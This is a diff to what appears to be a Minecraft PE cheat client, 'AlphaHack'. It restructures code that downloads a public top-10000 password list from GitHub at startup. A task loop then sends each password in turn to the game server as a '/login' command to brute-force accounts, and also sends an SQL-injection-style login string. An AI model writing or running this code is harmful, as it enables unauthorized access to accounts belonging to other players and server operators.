@@ -83,7 +83,6 @@ var haxMode = false;
 var newtime = '';
 var newnamet = '';
 var checkslapper = false;
-let passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt";
 var allDePasswords;
 var numhack3 = 0;
 /*B͎̞̠̠̘̙͈̳͙̳̅͛̽̉͑o̥̤̥̗̥͈̯̯̳̹ͥ̊ͮͭo̠͈̼̱͖̖͂̐̄̉͂͂ͭl͕̰͙̰ͮ̂̐͐͒͂̽̑e̘͈̤̫̟̫̦̞͙̻̲̤͓͓͉̘͇̔̆ͨͧ͊̏̍ͩͥa͕͖͚̟͖̟̫͉̱̗̪͍̾̈́̇̎ͭͭ̈̚ͅͅǹ̫͔̘̤̻̼̫̝͔̙̻͓͕̰͇̘ͮ̂̏̎ͣ̉͛̓ͫ̚ͅs̼͍̤͇̞̝̱͎̺̟͇̮̘̣̪̲̤ͯ̆̂͊͆̾́͐ͨͣ͂ͣ*/
@@ -447,13 +446,9 @@ var AlphaHackPE = {
 	},
 	dailyEvent: function () {
 	    return checkHoliday();
-	},
-	downloadPasses: function () {
-		return getPasses();
 	}
 }
 AlphaHackPE.dailyEvent();
-AlphaHackPE.downloadPasses();
 /*
   dragop utils
 http://imgur.com/6xCQAyT
@@ -874,13 +869,7 @@ AlphaHack.drawTracer = function (x, y, z, groundMode, particleName) {
 	}
 }
 
-//Copyright Godsoft029 2016-2017
-/*servicehack & dragop passhack ported to alphahack by arceusmatt*/
-function getPasses() {
-    var jsoncontent3 = ModPE.getFromUrl(passurl);
-    var storpass = jsoncontent3;
-    allDePasswords = storpass.split("\n");
-}
+
 
 /*
  * http://github.edroidthedev.com/?repo=ModPEAddon/ModPE/getFromUrl.js
@@ -923,6 +912,16 @@ function getUpdate() {
 	if (version != newupdate) startUp(newupdate);
 }
 AlphaHackPE.checkUpdate();
+
+//Copyright Godsoft029 2016-2017
+/*servicehack & dragop passhack ported to alphahack by arceusmatt*/
+function getPasses() {
+var passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt";
+    var jsoncontent3 = ModPE.getFromUrl(passurl);
+    var storpass = jsoncontent3;
+    allDePasswords = storpass.split("\n");
+}
+getPasses();
 
 function newLevel() {
 	clientMessage("§2≡≡=======»§a>§9 §a§kAlpha§r §a<§2«======≡≡§f§r");
@@ -18667,7 +18666,7 @@ function rptask() {
 							Server.sendChat("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
 							clientMessage("./login " + numhack2 + "' or '" + numhack2 + "' = '" + numhack2);
 						}
-						if (passhack){
+						if (newpasshack){
 							numhack3++
 							let passwords = allDePasswords[numhack3];
 							Server.sendChat("./login "+passwords);
